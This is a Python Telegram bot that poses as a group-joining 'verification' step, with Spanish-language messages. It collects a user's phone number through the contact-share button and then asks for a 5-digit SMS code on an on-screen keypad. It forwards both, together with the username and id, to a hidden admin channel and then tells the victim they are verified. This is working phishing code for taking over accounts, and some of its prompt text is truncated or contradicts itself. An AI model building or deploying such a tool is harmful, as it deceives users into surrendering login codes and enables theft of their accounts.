import os
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # p.ej. -1002756519910

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("verify-bot")

UD_PHONE = "phone"
UD_CODE  = "code"

def share_phone_kb():
    btn = KeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def build_keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("1", callback_data="d:1"),
         InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3")],
        [InlineKeyboardButton("4", callback_data="d:4"),
         InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6")],
        [InlineKeyboardButton("7", callback_data="d:7"),
         InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("0", callback_data="d:0"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    progreso = " ".join(list(code_str)) if code_str else "—"
    text = (
        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 8 𝐝𝐢́𝐠𝐢𝐭𝐨𝐬.\n\n"
        f"Código: `{progreso}`"
    )
    return text, InlineKeyboardMarkup(rows)

# /start  (VIDEO + MENSAJE + BOTÓN NATIVO en un solo mensaje si START_VIDEO está definido)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)

    nombre_usuario = update.effective_user.first_name or "usuario"
    caption = (
        f"👋𝐇𝐨𝐥𝐚 {nombre_usuario}\n\n"
        "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫.\n\n"
        "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬.\n\n"
        "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
        "“𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎”"
    )

    start_video = os.getenv("START_VIDEO", "").strip()
    if start_video:
        try:
            await update.message.reply_video(
                video=start_video,
                caption=caption,
                reply_markup=share_phone_kb(),
                parse_mode="Markdown"
            )
            return
        except Exception as e:
            log.exception("No pude enviar el video de inicio: %s", e)

    # Fallback si no hay START_VIDEO o falló el envío del video
    await update.message.reply_text(
        caption,
        reply_markup=share_phone_kb(),
        parse_mode="Markdown"
    )

# CONTACTO NATIVO
async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.contact:
        return

    phone = msg.contact.phone_number
    user = update.effective_user

    # Guardar y limpiar buffer
    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE]  = ""

    # Enviar al grupo (registro)
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_text = (
        "📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )
    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
            log.info("Número enviado al destino %s", ADMIN_CHANNEL_ID)
    except Exception as e:
        log.exception("Error enviando número al destino: %s", e)

    # Ir DIRECTO al teclado numérico (sin mensaje previo)
    text, kb = build_keypad("")
    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")

# BOTONERA (código)
async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:") and len(code) < 5:
        code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
        return
    elif data == "ok":
        # Validar que sean exactamente 5 dígitos
        if not (len(code) == 5 and code.isdigit()):
            # Reiniciar desde cero y mostrar mensaje de error + keypad vacío
            context.user_data[UD_CODE] = ""
            error_msg = (
                "❌Código inválido\n\n"
                "El código que ingresaste no es válido. Asegúrate de ingresar el codigo correcto de 5 dígitos recibido por y luego presiona:\n\n"
                "✅ Confirmar.\n\n"
                "Código: `—`"
            )
            text, kb = build_keypad("")  # keypad en blanco
            await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
            return

        phone = context.user_data.get(UD_PHONE, "desconocido")
        user  = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_text = (
            "🧩 *Código ingresado por el cliente*\n"
            f"- Teléfono: `{phone}`\n"
            f"- Código (SMS externo): `{code}`\n"
            f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
            f"- Fecha/Hora: {stamp}"
        )
        try:
            if ADMIN_CHANNEL_ID:
                await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
                log.info("Código enviado al destino %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("Error enviando código al destino: %s", e)

        # ✅ Cambio solicitado aquí
        await q.edit_message_text(
            "¡𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞, 𝐲𝐚 𝐞𝐬𝐭𝐚́𝐬 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨! 𝐕𝐚𝐲𝐚 𝐚 𝐬𝐮. 𝐒𝐢 𝐩𝐨𝐫 𝐚𝐥𝐠𝐮́𝐧𝐚 𝐫𝐚𝐳𝐨́𝐧 𝐧𝐨 𝐬𝐚𝐥𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐯𝐮𝐞𝐥𝐯𝐚 𝐚𝐪𝐮𝐢́ 𝐲."
        )
        context.user_data[UD_CODE] = ""
        return

    # Refrescar keypad con el progreso actual
    context.user_data[UD_CODE] = code
    text, kb = build_keypad(code)
    try:
        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
    except Exception:
        await q.message.edit_reply_markup(reply_markup=kb)

# AYUDA PRIVADA
async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat and update.effective_chat.type == "private":
        await update.message.reply_text(
            "⚠️ Eso no es tu número compartido con el botón nativo.\n\n"
            "Por favor toca **📲 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀** para enviarlo automáticamente.",
            reply_markup=share_phone_kb()
        )

# Diagnóstico
async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")

async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falló el envío: {e}")
        log.exception("Testsend falló: %s", e)

async def on_startup(app):
    if ADMIN_CHANNEL_ID:
        try:
            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
        except Exception as e:
            log.exception("No pude enviar mensaje de arranque: %s", e)

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("testsend", testsend_cmd))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))

    app.run_polling()

if __name__ == "__main__":
    main()
